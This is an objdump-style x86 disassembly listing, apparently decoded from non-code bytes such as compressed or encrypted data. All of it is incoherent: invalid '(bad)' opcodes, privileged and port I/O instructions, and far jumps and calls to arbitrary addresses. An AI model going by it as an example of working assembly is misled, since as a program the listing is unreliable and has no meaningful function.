  40dcb8:	ins    BYTE PTR es:[edi],dx
  40dcb9:	xlat   BYTE PTR ds:[ebx]
  40dcba:	mov    al,0x2d
  40dcbc:	pop    ebx
  40dcbd:	aam    0xa6
  40dcbf:	add    ch,al
  40dcc1:	loopne 0x40dcd4
  40dcc3:	jae    0x40dcb1
  40dcc5:	sub    edx,ebp
  40dcc7:	cwde   
  40dcc8:	xor    cl,cl
  40dcca:	fmul   DWORD PTR [esi-0x63]
  40dccd:	sub    ecx,ecx
  40dccf:	ret    0xc1d6
  40dcd2:	jecxz  0x40dd43
  40dcd4:	add    ecx,DWORD PTR [ebp-0x7f]
  40dcd7:	retf   0x88ba
  40dcda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcdb:	inc    esi
  40dcdc:	call   DWORD PTR [edi+0x4c0fd6ea]
  40dce2:	mov    al,0xc4
  40dce4:	call   0xfb7a:0x1f58ecc
  40dceb:	mov    bh,BYTE PTR [esi-0x78edca20]
  40dcf1:	fistp  QWORD PTR [edi+0x5913e372]
  40dcf7:	xor    DWORD PTR [edx],0x79
  40dcfa:	ja     0x40dd24
  40dcfc:	sub    edi,ebp
  40dcfe:	fimul  WORD PTR [ecx]
  40dd00:	loopne 0x40dd2f
  40dd02:	out    dx,eax
  40dd03:	call   0x75ab:0xa6516701
  40dd0a:	ficomp WORD PTR ds:0x7e77c0b8
  40dd10:	and    edx,DWORD PTR [ecx]
  40dd12:	adc    al,0x4d
  40dd14:	inc    ecx
  40dd15:	rdmsr  
  40dd17:	jecxz  0x40dd41
  40dd19:	mov    al,0x99
  40dd1b:	cs inc edx
  40dd1d:	pop    ebx
  40dd1e:	dec    esp
  40dd1f:	out    dx,al
  40dd20:	xchg   ebx,eax
  40dd21:	fisttp QWORD PTR [ebx-0x5f99b685]
  40dd27:	aad    0xf7
  40dd29:	or     eax,DWORD PTR [ebx+0x32]
  40dd2c:	fbstp  TBYTE PTR [ecx+0x20414a2]
  40dd32:	mov    ebp,0x7e56f01b
  40dd37:	ins    BYTE PTR es:[edi],dx
  40dd38:	xchg   edi,eax
  40dd39:	setb   BYTE PTR [edx+0x16]
  40dd3d:	lods   al,BYTE PTR ds:[esi]
  40dd3e:	mov    ecx,0x15fc6cf7
  40dd43:	dec    eax
  40dd44:	dec    edi
  40dd45:	xor    al,0x80
  40dd47:	ds retf 
  40dd49:	test   ah,0x2e
  40dd4c:	retf   0x6b
  40dd4f:	ret    
  40dd50:	sub    al,0xf1
  40dd52:	shr    BYTE PTR [eax],0x1b
  40dd55:	leave  
  40dd56:	xrelease mov BYTE PTR [eax-0x3b217c32],bh
  40dd5d:	push   ebx
  40dd5e:	xlat   BYTE PTR ds:[ebx]
  40dd5f:	sub    eax,0xf4e30796
  40dd64:	shl    BYTE PTR [edx+0x1a630f6],cl
  40dd6a:	jne    0x40dcf3
  40dd6c:	outs   dx,BYTE PTR ds:[esi]
  40dd6d:	lods   al,BYTE PTR ds:[esi]
  40dd6e:	(bad)  
  40dd6f:	fld    st(2)
  40dd71:	cli    
  40dd72:	shr    BYTE PTR [eax+0x49],0x8f
  40dd76:	xchg   edi,eax
  40dd77:	sbb    DWORD PTR [ebx-0x79],0xffffffb8
  40dd7b:	cld    
  40dd7c:	lea    ecx,[esi+0x25398040]
  40dd82:	daa    
  40dd83:	adc    BYTE PTR [ebx-0x265f0b67],0xef
  40dd8a:	stos   BYTE PTR es:[edi],al
  40dd8b:	fist   DWORD PTR [ecx+ebp*4]
  40dd8e:	adc    ecx,DWORD PTR es:[edx]
  40dd91:	ret    
  40dd92:	aas    
  40dd93:	mov    esi,DWORD PTR ds:0xf421baf0
  40dd99:	adc    ebp,ecx
  40dd9b:	jo     0x40dd6d
  40dd9d:	sbb    bh,BYTE PTR [esi+0x27]
  40dda0:	push   es
  40dda1:	push   esp
  40dda2:	cmp    eax,0xfc0b79e8
  40dda7:	add    ecx,ebp
  40dda9:	or     eax,0x7ccf3bff
  40ddae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddaf:	in     eax,dx
  40ddb0:	outs   dx,DWORD PTR ds:[esi]
  40ddb1:	int3   
  40ddb2:	outs   dx,DWORD PTR ds:[esi]
  40ddb3:	shr    DWORD PTR [ecx+0x11],0xed
  40ddb7:	dec    ecx
  40ddb8:	mov    edx,DWORD PTR [ebx-0x5fa436b2]
  40ddbe:	addr16 retf 0x421a
  40ddc2:	mov    ebp,0x79ed7f38
  40ddc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddc8:	fs push esp
  40ddca:	cmp    bh,dl
  40ddcc:	test   DWORD PTR [ebx+0x41],ebx
  40ddcf:	sar    DWORD PTR [ebp+0x4],0x29
  40ddd3:	jns    0x40de08
  40ddd5:	out    0x87,al
  40ddd7:	jmp    0x75195ab6
  40dddc:	repnz cmp eax,0x60678c26
  40dde2:	repnz xchg esi,eax
  40dde4:	mov    ds:0xb54b8a93,eax
  40dde9:	pop    ebx
  40ddea:	pop    ebp
  40ddeb:	pop    ebx
  40ddec:	push   0xffffffd8
  40ddee:	out    dx,al
  40ddef:	dec    BYTE PTR [ecx+eiz*8+0x6b]
  40ddf3:	push   ds
  40ddf4:	add    DWORD PTR [esi+0x5],esi
  40ddf7:	out    dx,eax
  40ddf8:	enter  0xf53b,0xfd
  40ddfc:	mov    esp,0x45fa5fc0
  40de01:	cwde   
  40de02:	add    eax,0x1af6d3fb
  40de07:	ss xchg edx,eax
  40de09:	sub    eax,0x2ec615ed
  40de0e:	sub    ebp,eax
  40de10:	dec    ebx
  40de11:	sbb    ebx,DWORD PTR [esi]
  40de13:	stc    
  40de14:	jge    0x40de72
  40de16:	push   0x12
  40de18:	xchg   cl,ch
  40de1a:	jle    0x40de4c
  40de1c:	mov    edi,DWORD PTR [eax-0x16]
  40de1f:	jmp    0xadc5ece1
  40de24:	popf   
  40de25:	xchg   esp,eax
  40de26:	fsub   st,st(2)
  40de28:	jmp    0x6cdb36b7
  40de2d:	outs   dx,DWORD PTR ds:[esi]
  40de2e:	cdq    
  40de2f:	cwde   
  40de30:	fcmovnbe st,st(0)
  40de32:	test   eax,ecx
  40de34:	mov    edi,0x302c5b50
  40de39:	arpl   WORD PTR ds:0xcffddeba,sp
  40de3f:	xchg   edi,eax
  40de40:	sub    al,0x12
  40de42:	daa    
  40de43:	xor    BYTE PTR [eax-0x2e],0x34
  40de47:	xchg   edi,eax
  40de48:	int3   
  40de49:	xlat   BYTE PTR ds:[ebx]
  40de4a:	jnp    0x40de84
  40de4c:	pop    ds
  40de4d:	push   es
  40de4e:	in     al,dx
  40de4f:	xchg   ebp,eax
  40de50:	sub    cl,BYTE PTR [edi+0x4f]
  40de53:	icebp  
  40de54:	outs   dx,BYTE PTR ds:[esi]
  40de55:	cmp    eax,0x42e97ee3
  40de5a:	xchg   edi,eax
  40de5b:	aam    0xbe
  40de5d:	(bad)  
  40de5e:	push   0xe3e67f5a
  40de63:	popa   
  40de64:	pop    ebx
  40de65:	xlat   BYTE PTR ds:[ebx]
  40de66:	test   BYTE PTR [ebx+0x53],dh
  40de69:	sahf   
  40de6a:	sbb    al,0x59
  40de6c:	scas   al,BYTE PTR es:[edi]
  40de6d:	jg     0x40de4e
  40de6f:	shl    BYTE PTR [edi],cl
  40de71:	and    edi,DWORD PTR [ebx-0x6f]
  40de74:	dec    edx
  40de75:	ficomp DWORD PTR [edx+0x50]
  40de78:	aad    0xeb
  40de7a:	mov    bl,0xf1
  40de7c:	mov    ebx,0x8d80eea9
  40de81:	mov    edi,0x5fa8b369
  40de86:	push   ebx
  40de87:	nop
  40de88:	aaa    
  40de89:	xchg   edi,eax
  40de8a:	mov    bl,0x76
  40de8c:	sar    BYTE PTR [ecx+ebx*8-0x3c],1
  40de90:	lods   al,BYTE PTR ds:[esi]
  40de91:	icebp  
  40de92:	mov    ah,0x31
  40de94:	and    al,0x64
  40de96:	xor    eax,DWORD PTR [ebx+eax*8-0xb]
  40de9a:	mov    ebp,DWORD PTR [esi+0x7dc8c3aa]
  40dea0:	out    0x24,al
  40dea2:	mov    BYTE PTR [eax+0x64],dh
  40dea5:	mov    esp,0x420580c7
  40deaa:	arpl   WORD PTR [edi+0x41],bx
  40dead:	ss mov esi,0x37b0df20
  40deb3:	add    esi,DWORD PTR gs:[ebx+0x1b848974]
  40deba:	dec    eax
  40debb:	and    eax,0x58826b9d
  40dec0:	adc    eax,0x221aad9a
  40dec5:	dec    esp
  40dec6:	mov    bh,0x3d
  40dec8:	cwd    
  40deca:	or     eax,DWORD PTR [esi+0x42]
  40decd:	mov    es,WORD PTR [ecx]
  40decf:	fild   WORD PTR ds:[esi+0x34]
  40ded3:	fldcw  WORD PTR [ebp-0x3804f5e7]
  40ded9:	repnz pop esi
  40dedb:	pop    es
  40dedc:	inc    esp
  40dedd:	cmp    DWORD PTR [eax],edx
  40dedf:	fidivr WORD PTR [ebp+0x78]
  40dee2:	jl     0x40def6
  40dee4:	stos   BYTE PTR es:[edi],al
  40dee5:	jo     0x40df1e
  40dee7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dee8:	mov    ds:0x2733e726,al
  40deed:	add    BYTE PTR [ebx-0x57],0x38
  40def1:	call   0x36c8f7b2
  40def6:	rol    DWORD PTR [esi+eax*4+0x20f0bdbb],1
  40defd:	shr    edx,0xba
  40df00:	jge    0x40de94
  40df02:	sub    ah,bl
  40df04:	nop
  40df05:	and    edx,ebx
  40df07:	jl     0x40df7c
  40df09:	fisubr WORD PTR [esi+0x3d04324a]
  40df0f:	cmp    ebx,DWORD PTR [ecx]
  40df11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df12:	rol    DWORD PTR [ebp+0x60],0xeb
  40df16:	mov    eax,DWORD PTR [edi+0xbe07173]
  40df1c:	test   BYTE PTR [ecx-0x2474eafb],dh
  40df22:	fldcw  WORD PTR [eax+0x43]
  40df25:	mov    ?,WORD PTR [ebx+0x22c4b609]
  40df2b:	cmp    ebp,esi
  40df2d:	leave  
  40df2e:	(bad)  
  40df2f:	jge    0x40df12
  40df31:	stos   DWORD PTR es:[edi],eax
  40df32:	lahf   
  40df33:	or     edi,DWORD PTR [eax+0x47f6fe49]
  40df39:	fxch   st(1)
  40df3b:	xor    eax,DWORD PTR [ebp+0x3a]
  40df3e:	lock xchg edx,eax
  40df40:	inc    edi
  40df41:	mov    ds:0x312006bb,eax
  40df46:	dec    ebp
  40df47:	nop
  40df48:	cmp    BYTE PTR [ecx-0x73d2e35e],bl
  40df4e:	in     al,0x5d
  40df50:	pop    es
  40df51:	aas    
  40df52:	call   0x2ae:0xf1d09e6a
  40df59:	push   ecx
  40df5a:	mov    bh,0xa3
  40df5c:	movq   QWORD PTR [ebp-0x17],mm2
  40df60:	jmp    0x16007929
  40df65:	call   0x9535:0xb8a4068c
  40df6c:	mov    ds:0xdcc5516d,al
  40df71:	or     esi,DWORD PTR [esi+0x1dc738df]
  40df77:	and    eax,0x53a2142f
  40df7c:	push   esi
  40df7d:	(bad)  [ebp+eax*2+0x14]
  40df81:	retf   
  40df82:	inc    esi
  40df83:	inc    edi
  40df84:	out    dx,al
  40df85:	out    0xcd,al
  40df87:	fidiv  DWORD PTR [edi]
  40df89:	mov    BYTE PTR [edi+0x13],ch
  40df8c:	mov    al,ds:0x26bc180f
  40df91:	scas   al,BYTE PTR es:[edi]
  40df92:	in     eax,0x64
  40df94:	mov    esi,0x95e2aab0
  40df99:	test   al,0x99
  40df9b:	and    BYTE PTR [ebx+ecx*2-0x3a],dh
  40df9f:	ins    BYTE PTR es:[edi],dx
  40dfa0:	mov    eax,ds:0x993a8cb2
  40dfa5:	nop
  40dfa6:	(bad)  
  40dfa8:	out    0x3f,al
  40dfaa:	sbb    al,0x60
  40dfac:	inc    eax
  40dfad:	xchg   esi,eax
  40dfae:	cwde   
  40dfaf:	(bad)  
  40dfb0:	mov    al,ds:0xe401793a
  40dfb5:	mov    eax,ss
  40dfb7:	sbb    ebx,ecx
  40dfb9:	neg    DWORD PTR [edx-0x49e6205c]
  40dfbf:	and    BYTE PTR es:[ebx-0x22],al
  40dfc3:	cdq    
  40dfc4:	adc    BYTE PTR [ecx+0x1d],bl
  40dfc7:	test   eax,0x59ff74ab
  40dfcc:	(bad)  
  40dfcd:	cmp    DWORD PTR [edi+0x10],ecx
  40dfd0:	mov    eax,0x78dd52e
  40dfd5:	fwait
  40dfd6:	lds    eax,FWORD PTR [ecx+edi*4]
  40dfd9:	out    0x15,eax
  40dfdb:	cmc    
  40dfdc:	mov    ds:0xd1832e8,eax
  40dfe1:	out    0x30,al
  40dfe3:	hlt    
  40dfe4:	lods   eax,DWORD PTR ds:[esi]
  40dfe5:	push   0x3b
  40dfe7:	int3   
  40dfe8:	sti    
  40dfe9:	pop    es
  40dfea:	inc    eax
  40dfeb:	push   ds
  40dfec:	into   
  40dfed:	mov    ds:0xd701aec1,al
  40dff2:	push   cs
  40dff3:	sbb    DWORD PTR [ebx],ebx
  40dff5:	or     BYTE PTR [edi],dh
  40dff7:	inc    eax
  40dff8:	popaw  
  40dffa:	dec    esp
  40dffb:	call   0x95008283
  40e000:	call   DWORD PTR [edi+0x1]
  40e003:	test   eax,0x40efa6ea
  40e008:	or     al,0x9f
  40e00a:	in     eax,dx
  40e00b:	sar    BYTE PTR [esi+0x79ec6f62],cl
  40e011:	cdq    
  40e012:	dec    esp
  40e013:	and    BYTE PTR ds:0x71caf05a,bh
  40e019:	out    dx,eax
  40e01a:	mov    al,0xc5
  40e01c:	xor    BYTE PTR [ebp-0x5809a61c],bl
  40e022:	sub    eax,0xb0502d6c
  40e027:	ins    BYTE PTR es:[edi],dx
  40e028:	push   ebx
  40e029:	pushf  
  40e02a:	pusha  
  40e02b:	xchg   BYTE PTR [edi+0x1f833875],bh
  40e031:	xchg   edx,eax
  40e032:	cld    
  40e033:	jp     0x40e027
  40e035:	and    BYTE PTR [edi+0x63af62ca],0xc9
  40e03c:	cwde   
  40e03d:	das    
  40e03e:	push   edx
  40e03f:	icebp  
  40e040:	fst    QWORD PTR [ecx+0x26]
  40e043:	mov    ebx,0x82f6a6d1
  40e048:	add    BYTE PTR ds:0xe4078354,0xa7
  40e04f:	sub    ch,dh
  40e051:	aas    
  40e052:	mov    bl,0x27
  40e054:	xor    dh,BYTE PTR [edi+0x73]
  40e057:	jmp    0xe0de:0x43d94208
  40e05e:	test   DWORD PTR [eax],ebx
  40e060:	add    al,0xae
  40e062:	dec    esp
  40e063:	cmp    ebp,esi
  40e065:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e066:	push   ecx
  40e067:	fcom   DWORD PTR [eax+0x79]
  40e06a:	add    dl,cl
  40e06c:	pop    eax
  40e06d:	and    esp,DWORD PTR [esi]
  40e06f:	mov    dl,0xcc
  40e071:	gs xchg esi,eax
  40e073:	add    eax,ebx
  40e075:	jle    0x40e025
  40e077:	jno    0x40e073
  40e079:	lods   al,BYTE PTR ds:[esi]
  40e07a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e07b:	mov    al,0xf3
  40e07d:	jno    0x40e0eb
  40e07f:	push   ds
  40e080:	sub    ebp,DWORD PTR [ebx]
  40e082:	xchg   edi,eax
  40e083:	push   ebx
  40e084:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e085:	int    0xcd
  40e087:	mov    BYTE PTR [eax],ch
  40e089:	ins    DWORD PTR es:[edi],dx
  40e08a:	shr    dh,0xea
  40e08d:	xchg   dl,bl
  40e08f:	lds    edi,FWORD PTR [ebx-0x20]
  40e092:	pop    ebp
  40e093:	es sbb al,0x7a
  40e096:	in     eax,0x3
  40e098:	and    ebx,DWORD PTR [ebx-0x29f1f2ce]
  40e09e:	pushw  0xffd3
  40e0a1:	jns    0x40e0f4
  40e0a3:	pop    ebx
  40e0a4:	test   BYTE PTR [esi+0x69],0x1b
  40e0a8:	call   FWORD PTR [eax+esi*4]
  40e0ab:	stos   BYTE PTR es:[edi],al
  40e0ac:	or     dl,al
  40e0ae:	add    dl,BYTE PTR [esi-0x70]
  40e0b1:	mov    al,ds:0x6aaee9fe
  40e0b6:	xor    BYTE PTR [edi-0x6e],0xce
  40e0ba:	ror    BYTE PTR [esp+ecx*4+0xa],cl
  40e0be:	cwde   
  40e0bf:	inc    edi
  40e0c0:	sbb    bl,ch
  40e0c2:	inc    ebp
  40e0c3:	add    BYTE PTR [edx],bh
  40e0c5:	pushf  
  40e0c6:	mov    ecx,0x5bea1868
  40e0cb:	lods   al,BYTE PTR ds:[esi]
  40e0cc:	lods   eax,DWORD PTR ds:[esi]
  40e0cd:	push   ss
  40e0ce:	stc    
  40e0cf:	adc    ecx,DWORD PTR [ebp-0x15]
  40e0d2:	mov    ah,0x8c
  40e0d4:	xchg   edi,eax
  40e0d5:	test   DWORD PTR [edi*8-0x2c6e8abe],ebp
  40e0dc:	jmp    0x40e079
  40e0de:	xor    esp,edi
  40e0e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0e1:	imul   eax,eax,0xe23ee7fe
  40e0e7:	es push edx
  40e0e9:	leave  
  40e0ea:	mov    dh,0xde
  40e0ec:	mov    edi,0xd71706bc
  40e0f1:	nop
  40e0f2:	stos   BYTE PTR es:[edi],al
  40e0f3:	push   cs
  40e0f4:	xchg   BYTE PTR ds:0x5d970ef3,bh
  40e0fa:	mov    esp,0x10d22a77
  40e0ff:	add    ch,BYTE PTR [eax-0x2635d367]
  40e105:	xchg   ecx,eax
  40e106:	popf   
  40e107:	add    dl,BYTE PTR [eax]
  40e109:	imul   ebx,DWORD PTR [edx-0xc780188],0xffffffd9
  40e110:	gs cmp eax,0xa52fbbaa
  40e116:	sub    dh,BYTE PTR [esi-0x2dfa2a2a]
  40e11c:	or     BYTE PTR [edi],ah
  40e11e:	and    bh,bl
  40e120:	mov    dh,0xc2
  40e122:	sbb    dl,ah
  40e124:	scas   eax,DWORD PTR es:[edi]
  40e125:	sbb    eax,0x44c9d390
  40e12a:	out    dx,al
  40e12b:	popf   
  40e12c:	pop    ebx
  40e12d:	or     ch,al
  40e12f:	test   DWORD PTR [esi-0x6c],ebp
  40e132:	dec    esi
  40e133:	pop    edi
  40e134:	pop    edx
  40e135:	lds    eax,FWORD PTR [esi+edx*2]
  40e138:	or     eax,0x89904fc3
  40e13d:	imul   ecx,esi,0x864fe960
  40e143:	push   ebx
  40e144:	push   es
  40e145:	jns    0x40e0ef
  40e147:	push   0x1bf48c05
  40e14c:	cmp    BYTE PTR [ecx+0x3a5e21f6],dl
  40e152:	(bad)  
  40e156:	leave  
  40e157:	push   cs
  40e158:	es cmp ebp,ecx
  40e15b:	push   0xffffffb7
  40e15d:	sbb    eax,0xa0b4fa56
  40e162:	enter  0x4804,0xbe
  40e166:	stos   BYTE PTR es:[edi],al
  40e167:	repnz mov ah,0x0
  40e16a:	in     eax,dx
  40e16b:	mov    edx,0x4c1a0f18
  40e170:	inc    ebx
  40e171:	add    al,ah
  40e173:	mov    DWORD PTR [esi+0x60],edx
  40e176:	scas   al,BYTE PTR es:[edi]
  40e177:	cmp    dl,BYTE PTR [ebx-0x53]
  40e17a:	pop    ebx
  40e17b:	repnz mov al,0xa6
  40e17e:	sub    ah,al
  40e180:	pop    ds
  40e181:	fsubr  DWORD PTR [eax]
  40e183:	mov    bl,0x2b
  40e185:	nop
  40e186:	jle    0x40e1ec
  40e188:	ret    0xc86a
  40e18b:	mov    ebx,DWORD PTR [ebp-0x3e0925af]
  40e191:	daa    
  40e192:	out    dx,al
  40e193:	jbe    0x40e193
  40e195:	push   ebp
  40e196:	xchg   ecx,eax
  40e197:	lea    esp,ds:0xc5bd26e4
  40e19d:	scas   eax,DWORD PTR es:[edi]
  40e19e:	inc    eax
  40e19f:	jns    0x40e1b9
  40e1a1:	rcr    DWORD PTR [eax+0x3c],cl
  40e1a4:	dec    ebp
  40e1a5:	sub    DWORD PTR [ecx],edx
  40e1a7:	in     eax,dx
  40e1a8:	sub    al,0xbf
  40e1aa:	pop    ebx
  40e1ab:	nop
  40e1ac:	xor    ebx,DWORD PTR [edx-0x50e7965e]
  40e1b2:	sub    edx,eax
  40e1b4:	bound  ecx,QWORD PTR [esi]
  40e1b6:	aam    0x1
  40e1b8:	retf   0x350d
  40e1bb:	je     0x40e1a6
  40e1bd:	popa   
  40e1be:	outs   dx,BYTE PTR ds:[esi]
  40e1bf:	call   0xb6c321a1
  40e1c4:	arpl   WORD PTR [edx-0x3bb2b321],bp
  40e1ca:	js     0x40e1f3
  40e1cc:	inc    ebx
  40e1cd:	mov    esi,0xe6e68ad4
  40e1d2:	cmp    BYTE PTR [eax-0x5bfcca2d],cl
  40e1d8:	mov    ah,0x63
  40e1da:	mov    edi,0x961e4bdc
  40e1df:	xor    DWORD PTR [eax],ecx
  40e1e1:	test   BYTE PTR [esi-0x13],bh
  40e1e4:	mov    esp,0xe49feabd
  40e1e9:	or     edx,DWORD PTR [esi-0x77eac9b7]
  40e1ef:	and    eax,0x97a5a759
  40e1f5:	cwde   
  40e1f6:	mov    cl,0x76
  40e1f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1f9:	sub    DWORD PTR [eax+ebx*8+0x255e8d6c],ebx
  40e200:	mov    dl,0xee
  40e202:	and    eax,0xef4edad1
  40e207:	adc    edi,DWORD PTR [edx+0x1bc62fa3]
  40e20d:	in     al,dx
  40e20e:	add    eax,0x18a1927b
  40e213:	mov    WORD PTR [esi+0x4bdc144b],fs
  40e219:	sub    DWORD PTR [eax-0x13],esi
  40e21c:	add    eax,0x610148e8
  40e221:	dec    edx
  40e222:	mov    WORD PTR [eax-0x16],fs
  40e225:	call   0x22a1:0xe124de11
  40e22c:	xchg   edi,eax
  40e22d:	mov    esi,0xbc792afc
  40e232:	mov    esp,0x3759a90a
  40e237:	xor    eax,0x9a2c051
  40e23c:	jge    0x40e27e
  40e23e:	mov    bh,0xfd
  40e240:	data16 jmp 0x40e222
  40e243:	push   edi
  40e244:	pop    ebp
  40e245:	fmul   QWORD PTR [edx+0x4b]
  40e248:	sahf   
  40e249:	fimul  DWORD PTR [edx-0x33]
  40e24c:	jae    0x40e25b
  40e24e:	int3   
  40e24f:	xor    edi,DWORD PTR [edi+0xba01132]
  40e255:	test   BYTE PTR [esi+0x38],dh
  40e258:	hlt    
  40e259:	mov    edi,DWORD PTR [esi+edx*4-0x40ea19bc]
  40e260:	(bad)  
  40e261:	cs jecxz 0x40e1f6
  40e264:	sbb    al,0xbd
  40e266:	cmp    esi,ecx
  40e268:	scas   al,BYTE PTR es:[edi]
  40e269:	sub    BYTE PTR [edi+0x7a],bl
  40e26c:	push   es
  40e26d:	out    0x41,al
  40e26f:	mov    WORD PTR [edi],?
  40e271:	cwde   
  40e272:	sbb    dh,dh
  40e274:	(bad)  
  40e275:	mov    ecx,0x65c23a95
  40e27a:	repz lea edi,ds:[esi-0x35dbfee9]
  40e282:	(bad)  
  40e283:	sar    DWORD PTR [ebp-0x5c],0xd6
  40e287:	jl     0x40e23a
  40e289:	and    DWORD PTR [edi],ebp
  40e28b:	cld    
  40e28c:	cdq    
  40e28d:	adc    esi,ecx
  40e28f:	fiadd  WORD PTR [esi-0x5e]
  40e292:	shl    ebx,0x5
  40e295:	jno    0x40e310
  40e297:	shl    BYTE PTR [ecx-0x4c],0xa0
  40e29b:	adc    BYTE PTR [edx-0x424b6ba],bh
  40e2a1:	dec    edi
  40e2a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2a3:	(bad)  
  40e2a4:	push   ss
  40e2a5:	lea    edi,[edx+ebp*4-0x64a52556]
  40e2ac:	and    BYTE PTR [esi+0x79],cl
  40e2af:	ror    DWORD PTR [ecx-0x4f],0x93
  40e2b3:	mov    eax,ds:0xa25256ca
  40e2b9:	clc    
  40e2ba:	xor    DWORD PTR [ebp+0x40],0xca97f628
  40e2c1:	cld    
  40e2c2:	out    dx,eax
  40e2c3:	bound  esp,QWORD PTR [esp+edi*8]
  40e2c6:	adc    bl,BYTE PTR [ebp+0xd53dae]
  40e2cc:	sbb    ecx,DWORD PTR [ebp+0xf4c6038]
  40e2d2:	out    dx,al
  40e2d3:	rcl    BYTE PTR [ecx],1
  40e2d5:	sbb    BYTE PTR [edi-0x56],al
  40e2d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2d9:	dec    ebx
  40e2da:	jge    0x40e2b4
  40e2dc:	cmp    ch,BYTE PTR [edx*2+0x223b10da]
  40e2e3:	jo     0x40e2f1
  40e2e5:	les    eax,FWORD PTR [ebx-0x53fa3893]
  40e2eb:	data16 mov fs,WORD PTR [eax+0x46]
  40e2ef:	imul   esp,DWORD PTR [eax+edx*8],0xffffffaa
  40e2f3:	push   ebp
  40e2f4:	out    dx,al
  40e2f5:	mov    eax,0x47a165bd
  40e2fa:	aad    0xb3
  40e2fc:	add    DWORD PTR [eax-0x6027d885],0x38
  40e303:	out    dx,al
  40e304:	sub    edi,esp
  40e306:	pop    ebp
  40e307:	cwde   
  40e308:	cmp    eax,0x65f22bd4
  40e30d:	into   
  40e30e:	test   eax,esp
  40e310:	xchg   ecx,eax
  40e311:	dec    eax
  40e312:	mov    ah,BYTE PTR ds:0xd1517541
  40e318:	xchg   ecx,eax
  40e319:	(bad)  
  40e31a:	outs   dx,DWORD PTR ds:[esi]
  40e31b:	adc    BYTE PTR [eax-0x3a205522],bl
  40e321:	repnz aas 
  40e323:	les    edx,FWORD PTR [ebp-0x9719e87]
  40e329:	push   ss
  40e32a:	out    0xd2,eax
  40e32c:	pop    esp
  40e32d:	jnp    0x40e31c
  40e32f:	lds    ebp,FWORD PTR [ecx-0x6245c3d7]
  40e335:	clc    
  40e336:	mov    ax,ds:0xd8e4b7c8
  40e33c:	push   0x52
  40e33e:	push   ecx
  40e33f:	pop    es
  40e340:	lea    edx,[edx-0x4b033448]
  40e346:	(bad)  
  40e347:	ins    BYTE PTR es:[edi],dx
  40e348:	js     0x40e3c3
  40e34a:	stc    
  40e34b:	inc    esi
  40e34c:	fs sti 
  40e34e:	push   cs
  40e34f:	stos   BYTE PTR es:[edi],al
  40e350:	out    0x88,eax
  40e352:	fcmove st,st(3)
  40e354:	stc    
  40e355:	(bad)  
  40e357:	jae    0x40e3d5
  40e359:	lods   eax,DWORD PTR ds:[esi]
  40e35a:	fs xchg ebx,eax
  40e35c:	pushf  
  40e35d:	aaa    
  40e35e:	outs   dx,DWORD PTR ds:[esi]
  40e35f:	ins    DWORD PTR es:[edi],dx
  40e360:	sti    
  40e361:	(bad)  
  40e362:	dec    ebx
  40e363:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e364:	iret   
  40e365:	pmullw mm3,mm7
  40e368:	add    DWORD PTR [esi],eax
  40e36a:	or     eax,DWORD PTR [eax]
  40e36c:	in     al,dx
  40e36d:	or     eax,0xa707d4d7
  40e372:	(bad)  
  40e373:	cmp    ch,BYTE PTR [edi+0x73391d1b]
  40e379:	inc    edi
  40e37a:	ja     0x40e396
  40e37c:	xchg   edi,eax
  40e37d:	and    dh,BYTE PTR [esi-0x46644808]
  40e383:	imul   BYTE PTR [eax]
  40e385:	jge    0x40e3a8
  40e387:	pop    edi
  40e388:	outs   dx,BYTE PTR ds:[esi]
  40e389:	xor    al,0x22
  40e38b:	sar    BYTE PTR [edi],0xfe
  40e38e:	xchg   esi,eax
  40e38f:	xchg   edx,eax
  40e390:	js     0x40e3aa
  40e392:	fisub  WORD PTR [esi]
  40e394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e395:	repnz dec edi
  40e397:	and    eax,0xf4cf12e1
  40e39c:	jne    0x40e333
  40e39e:	jecxz  0x40e3b9
  40e3a0:	std    
  40e3a1:	jns    0x40e32a
  40e3a3:	cmp    eax,0x59417036
  40e3a8:	or     dh,BYTE PTR ds:0xe065221a
  40e3ae:	add    ch,BYTE PTR [ebx]
  40e3b0:	lods   eax,DWORD PTR ds:[esi]
  40e3b1:	out    0x56,eax
  40e3b3:	jnp    0x40e3c3
  40e3b5:	lods   eax,DWORD PTR ds:[esi]
  40e3b6:	adc    al,0x5
  40e3b8:	sub    bh,ch
  40e3ba:	xchg   esp,eax
  40e3bb:	inc    edi
  40e3bc:	push   0x18b5ccab
  40e3c1:	out    dx,eax
  40e3c2:	adc    ebp,DWORD PTR [edi-0x637946f0]
  40e3c8:	or     DWORD PTR [eax],0xffffffb4
  40e3cb:	ins    BYTE PTR es:[edi],dx
  40e3cc:	inc    edx
  40e3cd:	cwde   
  40e3ce:	xchg   edx,eax
  40e3cf:	das    
  40e3d0:	jbe    0x40e3a0
  40e3d2:	fbstp  TBYTE PTR [eax-0x68]
  40e3d5:	stos   DWORD PTR es:[edi],eax
  40e3d6:	fwait
  40e3d7:	xchg   edx,eax
  40e3d8:	add    ebx,eax
  40e3da:	and    al,0x46
  40e3dc:	cmp    bh,BYTE PTR [eax+0x3d]
  40e3df:	mov    ch,0x23
  40e3e1:	sbb    cl,BYTE PTR [edx]
  40e3e3:	mov    ah,0x48
  40e3e5:	sub    DWORD PTR [edx+0x1],esp
  40e3e8:	call   0xa61a:0x208d6b46
  40e3ef:	or     DWORD PTR [esi-0x26],eax
  40e3f2:	mov    ecx,ecx
  40e3f4:	adc    BYTE PTR [edi+esi*4-0xf244bbb],0xcf
  40e3fc:	sub    BYTE PTR [esi+0x7c],ah
  40e3ff:	repz test al,0x9b
  40e402:	push   es
  40e403:	pop    edi
  40e404:	and    DWORD PTR [ecx+0x4a],0xa91f337e
  40e40b:	pop    eax
  40e40c:	cwde   
  40e40d:	push   esp
  40e40e:	xchg   ecx,eax
  40e40f:	mov    dl,0x26
